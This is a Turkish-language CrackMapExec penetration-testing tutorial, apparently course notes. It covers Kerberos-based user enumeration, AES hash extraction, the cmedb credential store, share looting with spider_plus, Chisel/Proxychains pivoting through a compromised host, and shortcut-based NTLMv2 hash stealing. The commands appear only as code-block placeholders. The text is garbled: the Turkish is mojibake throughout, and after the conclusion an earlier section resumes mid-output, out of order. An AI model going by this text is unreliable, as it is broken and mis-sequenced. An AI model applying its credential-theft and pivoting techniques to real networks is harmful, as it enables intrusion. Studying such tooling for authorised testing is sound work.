PopÃ¼ler modÃ¼ller bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, CrackMapExec, `get_netconnections` modÃ¼lÃ¼yle bilgisayarlarÄ±n IPv6 adreslerini belirlememize olanak tanÄ±r. Bu modÃ¼lÃ¼ kullanarak IPv6 Ã¼zerinden komutu Ã§alÄ±ÅŸtÄ±rmayÄ± deneyelim.

### get_netconnections ModÃ¼lÃ¼nÃ¼ Ã‡alÄ±ÅŸtÄ±rma ve IPv6 Kullanma

{{CODE_BLOCK_240}}

Åimdi IPv6 Ã¼zerinden hedefe eriÅŸelim.

{{CODE_BLOCK_241}}



### Tamamlanma YÃ¼zdesi

ArtÄ±k bir tarama Ã§alÄ±ÅŸÄ±rken enter tuÅŸuna basabilirsiniz ve CME size tamamlanma yÃ¼zdesini ve taranacak kalan host sayÄ±sÄ±nÄ± verecektir. Bu modÃ¼l laboratuvarÄ±nda her seferinde bir host'a saldÄ±rÄ±yoruz, ancak daha kapsamlÄ± bir aÄŸ bulduÄŸunuzda, bÃ¼yÃ¼k olasÄ±lÄ±kla bu Ã¶zelliÄŸi kullanacaksÄ±nÄ±z. Åimdilik `--shares` seÃ§eneÄŸini Ã§alÄ±ÅŸtÄ±ralÄ±m ve bitmeden Ã¶nce enter tuÅŸuna basalÄ±m.


### Tamamlanma YÃ¼zdesi

{{CODE_BLOCK_242}}

AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, Kerberos kimlik doÄŸrulamasÄ±nÄ± ve CrackMapExec'in bu kimlik doÄŸrulama yÃ¶ntemi iÃ§in iÃ§erdiÄŸi yeni deÄŸiÅŸiklikleri tartÄ±ÅŸacaÄŸÄ±z.

---


### Kerberos Authentication

Yazma sÄ±rasÄ±nda CrackMapEec, `SMB`, `LDAP` ve `MSSQL` protokolleri iÃ§in Kerberos Kimlik DoÄŸrulamasÄ±nÄ± desteklemektedir. Kerberos Kimlik DoÄŸrulamasÄ±nÄ± kullanmanÄ±n iki (2) yolu vardÄ±r:

* `ccache` dosyasÄ±nÄ± belirtmek iÃ§in `KRB5CCNAME` env adÄ±nÄ± kullanma. 
* CrackMapExec 5.4.0'dan baÅŸlayarak, artÄ±k Kerberos kimlik doÄŸrulamasÄ± iÃ§in bir Ticketla `KRB5CCNAME` environment variable'Ä±nÄ± kullanmamÄ±z gerekmiyor. Bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash kullanabiliriz.

Linux'ta Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanÄ±rken gÃ¶z Ã¶nÃ¼nde bulundurulmasÄ± gereken Ã¶nemli bir unsur, saldÄ±rdÄ±ÄŸÄ±mÄ±z bilgisayarÄ±n domain ve hedef makinenin `FQDN`'sini Ã§Ã¶zÃ¼mlemesi gerektiÄŸidir. Ä°nternal bir aÄŸdaysak, bilgisayarÄ±mÄ±zÄ± ÅŸirketin DNS'sine domain adÄ± Ã§Ã¶zÃ¼mlemeleri yapacak ÅŸekilde yapÄ±landÄ±rabiliriz, ancak durum bÃ¶yle deÄŸildir. DNS'i yapÄ±landÄ±ramayÄ±z ve `/etc/hosts` dosyasÄ±na domain controller ve hedef makinemiz iÃ§in FQDN'i manuel olarak eklememiz gerekecektir.


### Setting Up the /etc/hosts File

{{CODE_BLOCK_243}}

{{CODE_BLOCK_244}}

CrackMapExec'i Kerberos kimlik doÄŸrulamasÄ± ile kullanmayÄ± deneyelim.

### Username and Password - Kerberos Authentication

CrackMapExec'i `-k` veya `--kerberos` seÃ§eneÄŸi olmadan bir kullanÄ±cÄ± adÄ± ve parola veya kullanÄ±cÄ± adÄ± ve hash ile kullandÄ±ÄŸÄ±mÄ±zda, NTLM kimlik doÄŸrulamasÄ± gerÃ§ekleÅŸtiririz. Kerberos seÃ§eneÄŸini kullanÄ±rsak bunun yerine Kerberos kimlik doÄŸrulamasÄ±nÄ± kullanabiliriz.

### Kerberos Authentication

{{CODE_BLOCK_245}}




### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

Yeni Kerberos kimlik doÄŸrulama uygulamasÄ± ile CrackMapExec, CME iÃ§inde kendi `Kerbrute`'unu oluÅŸturmak iÃ§in tÃ¼m bileÅŸenlere sahiptir. Bu, CME'nin bir kullanÄ±cÄ±nÄ±n domain Ã¼zerinde var olup olmadÄ±ÄŸÄ±nÄ± ve bu kullanÄ±cÄ±nÄ±n Kerberos `pre-authentication` (`ASREPRoasting`) gerektirmeyecek ÅŸekilde yapÄ±landÄ±rÄ±lÄ±p yapÄ±landÄ±rÄ±lmadÄ±ÄŸÄ±nÄ± anlayabileceÄŸi anlamÄ±na gelir. Bunu aÅŸaÄŸÄ±daki hesaplarla Ã§alÄ±ÅŸÄ±rken gÃ¶relim: `account_not_exist` , `julio` , ve `robert` .


### Kerberos Kimlik DoÄŸrulamasÄ± ile KullanÄ±cÄ±larÄ± TanÄ±mlama

{{CODE_BLOCK_246}}

GÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi, `Kerbrute` CrackMapExec TGT isteklerini Ã¶n kimlik doÄŸrulamasÄ± olmadan gÃ¶nderdiÄŸinden, KDC bir KDC_ERR_C_PRINCIPAL_UNKNOWN hatasÄ±yla yanÄ±t verirse, kullanÄ±cÄ± adÄ± mevcut deÄŸildir. Ancak, KDC pre-authentication isterse, `KDC_ERR_PREAUTH_FAILED` hatasÄ±yla yanÄ±t verir, bu da kullanÄ±cÄ± adÄ±nÄ±n mevcut olduÄŸu anlamÄ±na gelir. Son olarak, `asreproast` saldÄ±rÄ±sÄ±na karÅŸÄ± savunmasÄ±z bir hata hesabÄ± gÃ¶rÃ¼rsek, daha Ã¶nce `AESREPRoast` HesaplarÄ±nÄ± Bulma bÃ¶lÃ¼mÃ¼nde gÃ¶rdÃ¼ÄŸÃ¼mÃ¼z gibi AESREPoast saldÄ±rÄ±larÄ±na karÅŸÄ± hassastÄ±r.

Bu, oturum aÃ§ma hatalarÄ±na neden olmaz, bu nedenle herhangi bir hesabÄ± kilitlemez, ancak Kerberos logu etkinleÅŸtirilmiÅŸse [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768) numaralÄ± bir Windows olay kimliÄŸi oluÅŸturur.


### AES-128 veya AES-256 kullanma

AyrÄ±ca, Kerberos Kimlik DoÄŸrulamasÄ± iÃ§in AES-128 veya AES-256 hash'leri de kullanabiliriz. `Impacket`'ten `Secretsdump` gibi araÃ§lar, genellikle bu tÃ¼r hash'leri alabilir. AES-128 veya AES-256 kullandÄ±ÄŸÄ±mÄ±zda, trafiÄŸimiz normal Kerberos trafiÄŸine daha Ã§ok benzeyecek ve bu da operasyonel bir avantaj (opsec) saÄŸlayacaktÄ±r. Hadi Secretsdump'u kullanalÄ±m ve ardÄ±ndan AES256 ile kimlik doÄŸrulamasÄ± yapalÄ±m.


### AES256 ile Kimlik DoÄŸrulama

{{CODE_BLOCK_247}}

{{CODE_BLOCK_248}}


### CCache file - Kerberos Authentication

Bir credential cache (veya [ccache](https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) ) Kerberos kimlik bilgilerini tutar. Genellikle kullanÄ±cÄ±nÄ±n oturumu sÃ¼rdÃ¼ÄŸÃ¼ sÃ¼rece geÃ§erli kalÄ±rlar, bu nedenle servislere birden fazla kez kimlik doÄŸrulamasÄ± yapmak (Ã¶rneÄŸin, bir web veya posta sunucusuna birden fazla kez baÄŸlanmak) her seferinde KDC ile iletiÅŸim kurmayÄ± gerektirmez.

Ã‡oÄŸu durumda, Linux makineleri Kerberos tickerlarÄ± ccache dosyalarÄ± olarak depolar, sistemlerin ticketlarÄ± kullanma ÅŸekli, `ccache` dosyasÄ±nÄ±n yolunu gÃ¶steren `KRB5CCNAME` environment variable aracÄ±lÄ±ÄŸÄ±yla olur. robert kullanÄ±cÄ±sÄ± iÃ§in bir ticket (ccache dosyasÄ±) oluÅŸturalÄ±m ve DC01'e kimlik doÄŸrulamasÄ± yapalÄ±m

Ticket'Ä± oluÅŸturmak iÃ§in [getTGT.py](https://github.com/fortra/impacket/blob/master/examples/getTGT.py) impacket aracÄ±nÄ± kullanacaÄŸÄ±z ve KRB5CCNAME environment variable'i getTGT.py tarafÄ±ndan oluÅŸturulan ccache dosyasÄ±nÄ±n yoluna ayarlayacaÄŸÄ±z.


### Ticket Granting Tickets

{{CODE_BLOCK_249}}

{{CODE_BLOCK_250}}

Kerberos kimlik doÄŸrulama yÃ¶ntemimiz olarak `KRB5CCNAME` environment variable'ini kullanmak iÃ§in `--use-kcache` seÃ§eneÄŸini kullanmamÄ±z gerekir. KullanÄ±cÄ± adÄ± ve parola seÃ§enekleri gerekli deÄŸildir.


### ccache DosyasÄ±nÄ± Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak Kullanma (SMB ProtokolÃ¼)

{{CODE_BLOCK_251}}


### Kerberos Kimlik DoÄŸrulama YÃ¶ntemi Olarak ccache DosyasÄ±nÄ±n KullanÄ±lmasÄ± (LDAP ProtokolÃ¼)

{{CODE_BLOCK_252}}

Kerberos Kimlik DoÄŸrulamasÄ±nÄ± `MSSQL` protokolÃ¼ ile kullanmak iÃ§in hedef olarak IP adresi yerine bilgisayar adÄ±nÄ± veya FQDN'yi belirtmemiz gerekir. Bunun nedeni, MSSQL protokolÃ¼nÃ¼n perde arkasÄ±nda IP'yi FQDN'ye dÃ¶nÃ¼ÅŸtÃ¼rmemesi, ancak SMB ve LDAP protokollerinin bunu yapmasÄ±dÄ±r.


### MSSQL ProtokolÃ¼ ile ccache DosyasÄ±nÄ± Kullanma

{{CODE_BLOCK_253}}

KullanÄ±cÄ± adlarÄ± ve parolalarla yaptÄ±ÄŸÄ±mÄ±z gibi Kerberos kimlik doÄŸrulamasÄ± ile herhangi bir modÃ¼lÃ¼ veya seÃ§eneÄŸi Ã§alÄ±ÅŸtÄ±rabiliriz


### Kerberos Kimlik DoÄŸrulamasÄ± ile PaylaÅŸÄ±mlarÄ± Listeleme


{{CODE_BLOCK_254}}


CrackMapExec ile Kerberos Authentication'Ä±n nasÄ±l kullanÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrendik. AÅŸaÄŸÄ±daki bÃ¶lÃ¼mde, CrackMapExec veritabanÄ± `cmedb` ile etkileÅŸime gireceÄŸiz

---


### CMEDB'de UzmanlaÅŸmak

CME otomatik olarak tÃ¼m kullanÄ±lan/dump edilen kimlik bilgilerini (diÄŸer bilgilerle birlikte) ilk Ã§alÄ±ÅŸtÄ±rmada kurulan `SQLite` veritabanÄ±nda saklar. TÃ¼m Ã§alÄ±ÅŸma alanlarÄ± ve ilgili veritabanlarÄ± `~/.cme/workspaces` iÃ§inde saklanÄ±r. VarsayÄ±lan veritabanlarÄ± `~/.cme/workspaces/default` dizininde bulunur. Bu dizinde her protokol iÃ§in bir SQLite dosyasÄ± bulunur.


### VarsayÄ±lan VeritabanlarÄ±nÄ± Listeleme

{{CODE_BLOCK_255}}

### VeritabanÄ± ile EtkileÅŸim

CME, back-end veritabanÄ± ile etkileÅŸimi kolaylaÅŸtÄ±ran ikinci bir komut satÄ±rÄ± script'i olan `cmedb` ile birlikte gelir. cmedb komutunu yazmak bizi bir komut shell'i gÃ¶tÃ¼recektir:

### CMEDB

{{CODE_BLOCK_256}}


### Workspaces

VarsayÄ±lan workspace adÄ± `default` olarak adlandÄ±rÄ±lÄ±r (bilgi `prompt` gÃ¶sterildiÄŸi gibi). Bir workspace seÃ§ildiÄŸinde, CME'de yaptÄ±ÄŸÄ±mÄ±z her ÅŸey bu workspace'de saklanacaktÄ±r. Bir workspace oluÅŸturmak iÃ§in, `cmedb (default) >` komut promt root'una gitmemiz gerekir. EÄŸer protokol veritabanÄ±ndaysak, geri komutunu kullanmamÄ±z gerekir.


### Creating a Workspace

{{CODE_BLOCK_257}}

Workspace'leri listelemek iÃ§in `workspace list` , workspace'i deÄŸiÅŸtirmek iÃ§in ise `workspace <workspace>` yazabiliriz.


### Workspace'leri Listeleme ve DeÄŸiÅŸtirme

{{CODE_BLOCK_258}}


### Bir ProtokolÃ¼n VeritabanÄ±na EriÅŸim

cmedb her protokol iÃ§in bir veritabanÄ±na sahiptir, ancak bu modÃ¼lÃ¼n yazÄ±ldÄ±ÄŸÄ± sÄ±rada yalnÄ±zca `SMB` ve `MSSQL` yararlÄ± seÃ§eneklere sahiptir:

| Protokol | SeÃ§enekler                                         |
| -------- | -------------------------------------------------- |
| SMB      | back exit export import groups hosts import shares |
| MSSQL    | back exit export import host import                |
| LDAP     | back exit export import                            |
| WinRM    | back exit export import                            |
| RDP      | back exit export import                            |
| FTP      | back exit export import                            |
| SSH      | back exit export import                            |

Bir protokolÃ¼n veritabanÄ±na eriÅŸmek iÃ§in `proto` `<protocol>` komutunu Ã§alÄ±ÅŸtÄ±rÄ±n. Protokol iÃ§inde, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `help` seÃ§eneÄŸini kullanabiliriz:

### SMB Protokol VeritabanÄ±na BaÄŸlanma

{{CODE_BLOCK_259}}


### Protocol Options

SMB veya MSSQL protokolÃ¼nÃ¼ her kullandÄ±ÄŸÄ±mÄ±zda, kimlik bilgileri, saldÄ±rdÄ±ÄŸÄ±mÄ±z hostlar, eriÅŸtiÄŸimiz paylaÅŸÄ±mlar ve listelediÄŸimiz gruplar CrackMapExec veritabanÄ±nda saklanÄ±r. VeritabanÄ±nda sahip olduÄŸumuz verilere eriÅŸelim.

### Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

CrackMapExec veritabanÄ±, CrackMapExec kullanarak kullandÄ±ÄŸÄ±mÄ±z veya elde ettiÄŸimiz tÃ¼m kimlik bilgilerini depolar. Bu veritabanÄ±, kimlik bilgilerinin tÃ¼rÃ¼nÃ¼, `dÃ¼z metin` veya `hash` olup olmadÄ±ÄŸÄ±nÄ±, domain, kullanÄ±cÄ± adÄ± ve ÅŸifreyi saklar. SMB protokolÃ¼nÃ¼n kimlik bilgilerini gÃ¶rmek iÃ§in protokol iÃ§indeki `creds` seÃ§eneÄŸini kullanmamÄ±z gerekir.


### Displaying SMB Credentials

{{CODE_BLOCK_260}}


GÃ¶rdÃ¼ÄŸÃ¼nÃ¼z gibi, creds'ten sonra bir `kullanÄ±cÄ± adÄ±` ekleyerek belirli kullanÄ±cÄ±larÄ± da sorgulayabiliriz. AyrÄ±ca `creds hash` seÃ§eneÄŸi ile tÃ¼m hash'leri veya `creds plaintext` seÃ§eneÄŸi ile tÃ¼m plaintext kimlik bilgilerini listeleyebiliriz.


### Hash'leri ve DÃ¼z Metin Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_261}}


Not: cmedb, mevcut seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in sekme otomatik tamamlamaya izin verir

MSSQL kimlik bilgileri MSSQL protokolÃ¼ne kaydedilir ve SMB kimlik bilgilerini gÃ¶rÃ¼ntÃ¼lediÄŸimiz gibi gÃ¶rÃ¼ntÃ¼lenebilir


### MSSQL iÃ§in Kimlik Bilgilerini GÃ¶rÃ¼ntÃ¼leme

{{CODE_BLOCK_262}}

Not: Domain alanÄ±nÄ± bir bilgisayar ile gÃ¶rÃ¼yorsak, bu bir MSSQL hesabÄ± kullandÄ±ÄŸÄ±mÄ±z anlamÄ±na gelir.

### Kimlik Bilgilerini Kullanma

CrackMapExec'i Ã§alÄ±ÅŸtÄ±rmak iÃ§in veritabanÄ±ndaki kimlik bilgilerini de kullanabiliriz. Kullanmak istediÄŸimiz kimlik bilgilerini tanÄ±mlamamÄ±z ve hangi id'nin hesapla iliÅŸkili olduÄŸunu belirlememiz gerekir. `Julio`'nun kimlik bilgilerini `id 4` ile kullanalÄ±m. KullanÄ±cÄ± adÄ± ve parola yerine bir kimlik bilgisi kullanmak iÃ§in `-id CredID` seÃ§eneÄŸini kullanmamÄ±z gerekir.

### CrackMapExec ile EtkileÅŸim iÃ§in CredID KullanÄ±mÄ±

{{CODE_BLOCK_263}}


### Hosts Information

MSSQL ve SMB iÃ§in, eriÅŸim saÄŸladÄ±ÄŸÄ±mÄ±z bilgisayarlarÄ±, IP'lerini, domainlerini ve iÅŸletim sistemlerini de belirleyebiliriz.


### Displaying Hosts

{{CODE_BLOCK_264}}


### Share Information

CME veritabanÄ± da belirlediÄŸimiz paylaÅŸÄ±mlÄ± klasÃ¶rleri saklÄ±yor ve okuma ve yazma eriÅŸimine sahip kullanÄ±cÄ±larÄ±mÄ±z olup olmadÄ±ÄŸÄ±nÄ± bize sÃ¶ylÃ¼yor. PaylaÅŸÄ±m bilgilerine eriÅŸmek iÃ§in `cmedb` iÃ§erisinde SMB protokolÃ¼ iÃ§erisinde `shares` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.

### PaylaÅŸÄ±mlarÄ± Geri Alma

{{CODE_BLOCK_265}}


### KullanÄ±cÄ± Ekleme ve KaldÄ±rma

CME, kullanÄ±cÄ±larÄ± veritabanÄ±ndan manuel olarak ekleme veya kaldÄ±rma Ã¶zelliÄŸini destekler. ProtokolÃ¼ (SMB veya MSSQL) seÃ§iyoruz ve `creds add` veya `creds remove` kullanÄ±yoruz.


### cmedb'ye KullanÄ±cÄ± Ekleme

{{CODE_BLOCK_266}}

Åimdi eklediÄŸimiz kullanÄ±cÄ±yÄ± kaldÄ±rmayÄ± deneyebiliriz.

### Bir KullanÄ±cÄ±yÄ± cmedb'den KaldÄ±rma

{{CODE_BLOCK_267}}


### Empire Kimlik Bilgilerini Ä°mport Etme

cmedb'nin sahip olduÄŸu bir baÅŸka Ã¶zellik de `Empire`'dan kimlik bilgilerini import etme yeteneÄŸidir.


### Import from Empire

{{CODE_BLOCK_268}}

Not: Bu Ã¶zelliÄŸi kullanmak istiyorsanÄ±z `Empire`'Ä± yapÄ±landÄ±rdÄ±ÄŸÄ±nÄ±zdan emin olun

### Export cmedb Data

CrackMapExec veritabanÄ±ndan kimlik bilgilerini, hostlarÄ±, local adminleri ve paylaÅŸÄ±mlarÄ± export edebiliriz.

### Kimlik Bilgilerini cmedb'den Export Etme

{{CODE_BLOCK_269}}

{{CODE_BLOCK_270}}

Veriler CSV dosyasÄ± olarak dÄ±ÅŸa aktarÄ±lÄ±r. `LibreOffice` veya `Excel` gibi araÃ§larÄ± kullanarak aÃ§abiliriz.

![Pasted image 20241203155509.png](/img/user/resimler/Pasted%20image%2020241203155509.png)


### Son

CrackMapExec, aÄŸ gÃ¼venliÄŸi testlerinde ve sÄ±zma testlerinde kullanÄ±cÄ±larÄ±n iÅŸini kolaylaÅŸtÄ±ran, etkili bir araÃ§tÄ±r. GeniÅŸ protokol desteÄŸi, hÄ±zlÄ± keÅŸif, gÃ¼venlik aÃ§Ä±klarÄ± tespiti ve yÃ¶netimsel haklar elde etme gibi Ã§eÅŸitli Ã¶zellikleriyle gÃ¼venlik profesyonellerinin vazgeÃ§ilmez araÃ§larÄ± arasÄ±nda yer alÄ±r. Bu araÃ§, aÄŸ yapÄ±larÄ±nÄ±n daha gÃ¼venli hale getirilmesi iÃ§in Ã¶nemli bir rol oynar ve her gÃ¼venlik uzmanÄ±nÄ±n repertuarÄ±nda bulunmasÄ± gereken bir araÃ§tÄ±r.


, 'netlogon', 'sysvol']
SPIDER_P... 10.129.203.121 445 DC01 [*] EXT:
['ico', 'lnk']
SPIDER_P... 10.129.203.121 445 DC01 [*] SIZE: 51200
SPIDER_P... 10.129.203.121 445 DC01 [*] OUTPUT:
/tmp/cme_spider_plus
```

Dizine gidebilir ve kullanÄ±cÄ±nÄ±n eriÅŸebileceÄŸi tÃ¼m dosyalarÄ±n bir listesini alabiliriz:


### KullanÄ±cÄ±nÄ±n KullanabileceÄŸi DosyalarÄ± Listeleme

{{CODE_BLOCK_94}}

EÄŸer paylaÅŸÄ±mÄ±n tÃ¼m iÃ§eriÄŸini indirmek istiyorsak `READ_ONLY=false` seÃ§eneÄŸini aÅŸaÄŸÄ±daki gibi kullanabiliriz:

{{CODE_BLOCK_95}}

{{CODE_BLOCK_96}}

Not: SabÄ±rlÄ± olmamÄ±z gerekiyor. PaylaÅŸÄ±lan klasÃ¶r ve dosya sayÄ±sÄ±na baÄŸlÄ± olarak iÅŸlem birkaÃ§ dakika sÃ¼rebilir

`spider_plus` modÃ¼lÃ¼ iÃ§in mevcut tÃ¼m seÃ§enekleri gÃ¶rÃ¼ntÃ¼lemek iÃ§in `--options` seÃ§eneÄŸini kullanabiliriz:


### Spider_plus Options

{{CODE_BLOCK_97}}

Bir sonraki bÃ¶lÃ¼mde CrackMapExec'in bir `proxy` aracÄ±lÄ±ÄŸÄ±yla diÄŸer aÄŸlara ulaÅŸmak iÃ§in nasÄ±l kullanÄ±lacaÄŸÄ± anlatÄ±lacaktÄ±r.


---


### Proxychains with CME

### Scenario

Ä°nternal bir Pentest Ã¼zerinde Ã§alÄ±ÅŸÄ±yoruz. Bir aÄŸ taramasÄ± gerÃ§ekleÅŸtirdik ve yalnÄ±zca bir host (10.129.204.133) tespit edip ele geÃ§irebildik. Ele geÃ§irilen bu host Ã¼zerinde `ipconfig` Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±zda, iki aÄŸ baÄŸdaÅŸtÄ±rÄ±cÄ±sÄ± olduÄŸunu fark ettik. ARP tablosu `172.16.1.10` IP adresine sahip baÅŸka bir hostu gÃ¶steriyor. TopladÄ±ÄŸÄ±mÄ±z bilgilere dayanarak aÅŸaÄŸÄ±daki senaryoya sahibiz:

![Pasted image 20241202141946.png](/img/user/resimler/Pasted%20image%2020241202141946.png)

DC01'e ve bu aÄŸdaki (172.16.1.0/24) herhangi bir makineye saldÄ±rmak iÃ§in, saldÄ±rÄ± hostumuz ile MS01 arasÄ±nda bir `tÃ¼nel` kurmalÄ±yÄ±z. Bu nedenle, CME tarafÄ±ndan yÃ¼rÃ¼tÃ¼len tÃ¼m komutlar MS01 Ã¼zerinden geÃ§er.


### Set Up the Tunnel

TÃ¼nelimizi kurmak iÃ§in [Chisel](https://github.com/jpillora/chisel) kullanacaÄŸÄ±z. [Release](https://github.com/jpillora/chisel/releases)'e gidelim ve saldÄ±racaÄŸÄ±mÄ±z makinemiz iÃ§in en son Windows binary'sini ve saldÄ±rÄ± hostumuzda kullanmak iÃ§in en yeni Linux binary'sini indirelim ve aÅŸaÄŸÄ±daki adÄ±mlarÄ± gerÃ§ekleÅŸtirelim:

*  Chisel'Ä± SaldÄ±rÄ± Hostumuza indirin ve Ã‡alÄ±ÅŸtÄ±rÄ±n:

### Chisel - Reverse Tunnel

{{CODE_BLOCK_98}}


*  Chisel for Windows'u Ä°ndirin ve Hedef Host'a YÃ¼kleyin:


### Upload Chisel

{{CODE_BLOCK_99}}


* CrackMapExec komut yÃ¼rÃ¼tme seÃ§eneÄŸi `-x`'i kullanarak Chisel sunucumuza baÄŸlanmak iÃ§in `chisel.exe` dosyasÄ±nÄ± Ã§alÄ±ÅŸtÄ±rÄ±n (Bu seÃ§eneÄŸi Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha fazla tartÄ±ÅŸacaÄŸÄ±z)


### Connect to the Chisel Server

{{CODE_BLOCK_100}}

Bu terminaldeki komut, hedef makinadaki **Chisel** process'ini durdurana kadar Ã§alÄ±ÅŸmaya devam edecektir. Bunu bu bÃ¶lÃ¼mde daha sonra yapacaÄŸÄ±z.

**Attack host** Ã¼zerinde, **Chisel server** Ã§Ä±ktÄ±sÄ±nda **bir client baÄŸlantÄ±sÄ± aldÄ±ÄŸÄ±mÄ±zÄ± ve tÃ¼neli baÅŸlattÄ±ÄŸÄ±mÄ±zÄ±** gÃ¶steren yeni bir satÄ±r gÃ¶rmeliyiz.

### Chisel Receiving Session No. 1

{{CODE_BLOCK_101}}

TCP 1080 portunun dinlenip dinlenmediÄŸini kontrol ederek de tÃ¼nelin Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ± doÄŸrulayabiliriz:


### Check Listening Port

{{CODE_BLOCK_102}}

* Proxyychains'i Chisel varsayÄ±lan portu `TCP 1080`'i kullanacak ÅŸekilde yapÄ±landÄ±rmamÄ±z gerekir. YapÄ±landÄ±rma dosyasÄ±nÄ±n ProxyList bÃ¶lÃ¼mÃ¼ne `socks5 127.0.0.1 1080`'i aÅŸaÄŸÄ±daki gibi eklediÄŸimizden emin olmamÄ±z gerekiyor:


### Configure Proxychains

{{CODE_BLOCK_103}}

* ArtÄ±k 172.16.1.10 IP'sine ulaÅŸmak iÃ§in `Proxychains` aracÄ±lÄ±ÄŸÄ±yla CrackMapExec'i kullanabiliriz:

### CrackMapExec'in Proxychains ile Test Edilmesi

{{CODE_BLOCK_104}}


Proxychains Ã§Ä±ktÄ±sÄ±nÄ± konsoldan kaldÄ±rmak iÃ§in `Proxychains4` ve `quiet -q` seÃ§eneÄŸini kullanabiliriz:

### Quiet SeÃ§eneÄŸi ile Proxychains4

{{CODE_BLOCK_105}}

Proxychains aracÄ±lÄ±ÄŸÄ±yla herhangi bir CME iÅŸlemi gerÃ§ekleÅŸtirebiliriz.


### Killing Chisel on the Target Machine

Ä°ÅŸimiz bittiÄŸinde, Chisel process'ini kill etmemiz gerekir. Bunu yapmak iÃ§in, PowerShell komutlarÄ±nÄ± yÃ¼rÃ¼tmek iÃ§in `-X` seÃ§eneÄŸini kullanacaÄŸÄ±z ve PowerShell komutunu Ã§alÄ±ÅŸtÄ±racaÄŸÄ±z `Stop-Process - Name chisel -Force .` Komut yÃ¼rÃ¼tme konusunu Komut YÃ¼rÃ¼tme bÃ¶lÃ¼mÃ¼nde daha ayrÄ±ntÄ±lÄ± olarak ele alacaÄŸÄ±z.


### Kill the Chisel Client

{{CODE_BLOCK_106}}

Bunu yaptÄ±ktan sonra, Chisel client komutunu Ã§alÄ±ÅŸtÄ±rdÄ±ÄŸÄ±mÄ±z terminal aÅŸaÄŸÄ±daki gibi sonuÃ§lanmalÄ±dÄ±r:


### Chisel'i Zorla Durdurduktan Sonra Terminalin KapanmasÄ±

{{CODE_BLOCK_107}}

ArtÄ±k saldÄ±rÄ± konaÄŸÄ±mÄ±zdaki Chisel sunucusunu CTRL + C ile kapatabiliriz.


### Attack Host Ãœzerinde Chisel'i Kapatma

{{CODE_BLOCK_108}}


### Sunucu olarak Windows ve Client olarak Linux

Chisel'i Windows workstation'da bir sunucu olarak baÅŸlatarak ve saldÄ±rÄ± hostumuzu client olarak kullanarak bunun tersini de yapabiliriz. Chisel'i sunucu olarak baÅŸlatmak iÃ§in `server --socks5` seÃ§eneÄŸini kullanacaÄŸÄ±z.


### Chisel'i Hedef Makinede Sunucu Olarak BaÅŸlatma

{{CODE_BLOCK_109}}

Åimdi hedef makinemiz Chisel sunucusuna baÄŸlanmak ve proxy'yi etkinleÅŸtirmek iÃ§in IP ve porttan sonra `socks` seÃ§eneÄŸini kullanmamÄ±z gerekiyor.


### Attack Hostumuzdan Chisel Sunucusuna BaÄŸlanma

{{CODE_BLOCK_110}}

Åimdi Proxychains'i tekrar kullanabiliriz:

### Internal Network'e BaÄŸlanmak iÃ§in Proxy Chain'i Kullanma

{{CODE_BLOCK_111}}

Bu bÃ¶lÃ¼mde, **attack host** Ã¼zerinde **Proxychains** ve **Chisel** yapÄ±landÄ±rmayÄ± ve **CrackMapExec** kullanarak hedef makinede **Chisel** Ã§alÄ±ÅŸtÄ±rmayÄ± Ã¶ÄŸrendik.

Ä°lerleyen bÃ¶lÃ¼mlerde, diÄŸer aÄŸlara ulaÅŸmak iÃ§in `CrackMapExec` ve `Proxychains` kullanacaÄŸÄ±z.

---

### Stealing Hashes

Yeni hesaplarÄ± ele geÃ§irmek iÃ§in kullanÄ±lan en yaygÄ±n tekniklerden biri parola hashlerinin Ã§alÄ±nmasÄ±dÄ±r. Bunu baÅŸarmanÄ±n farklÄ± yÃ¶ntemleri vardÄ±r, ancak yaygÄ±n olanÄ±, bir bilgisayarÄ± veya kullanÄ±cÄ±yÄ± kontrol ettiÄŸimiz sahte bir paylaÅŸÄ±lan klasÃ¶rle bir kimlik doÄŸrulama iÅŸlemi baÅŸlatmaya zorlamaktÄ±r.

Bu kimlik doÄŸrulama iÅŸlemini baÅŸlatÄ±rken, kullanÄ±cÄ± veya bilgisayar bunu bir NTLMv2 hash'i ile yapar. Bu hash, Hashcat gibi bir araÃ§ kullanÄ±larak kÄ±rÄ±labilir veya kimlik bilgilerini bilmeden kullanÄ±cÄ±nÄ±n kimliÄŸine bÃ¼rÃ¼nmek iÃ§in baÅŸka bir bilgisayara iletilebilir.

PaylaÅŸÄ±lan klasÃ¶rleri kullanarak hash'leri Ã§almak iÃ§in bir kÄ±sayol oluÅŸturabilir ve kÄ±sayolda gÃ¶rÃ¼nen simge sahte paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼zÃ¼ gÃ¶sterecek ÅŸekilde yapÄ±landÄ±rabiliriz. KullanÄ±cÄ± paylaÅŸÄ±lan klasÃ¶re girdiÄŸinde, simgenin konumunu aramaya Ã§alÄ±ÅŸacak ve paylaÅŸÄ±lan klasÃ¶rÃ¼mÃ¼ze karÅŸÄ± kimlik doÄŸrulamasÄ±nÄ± zorlayacaktÄ±r.

NTLMv2 hash'lerini toplama hakkÄ±nda daha fazla bilgi edinmek iÃ§in RedTeam Ekipler iÃ§in [Farming blogunu okuyabiliriz: MDsec'ten NetNTLM hasadÄ±](https://www.mdsec.co.uk/2021/02/farming-for-red-teams-harvesting-netntlm/), sadece kÄ±sayollarÄ±n kullanÄ±mÄ±nÄ± deÄŸil, aynÄ± amaca hizmet eden diÄŸer dosya tÃ¼rlerini de gÃ¶sterir.


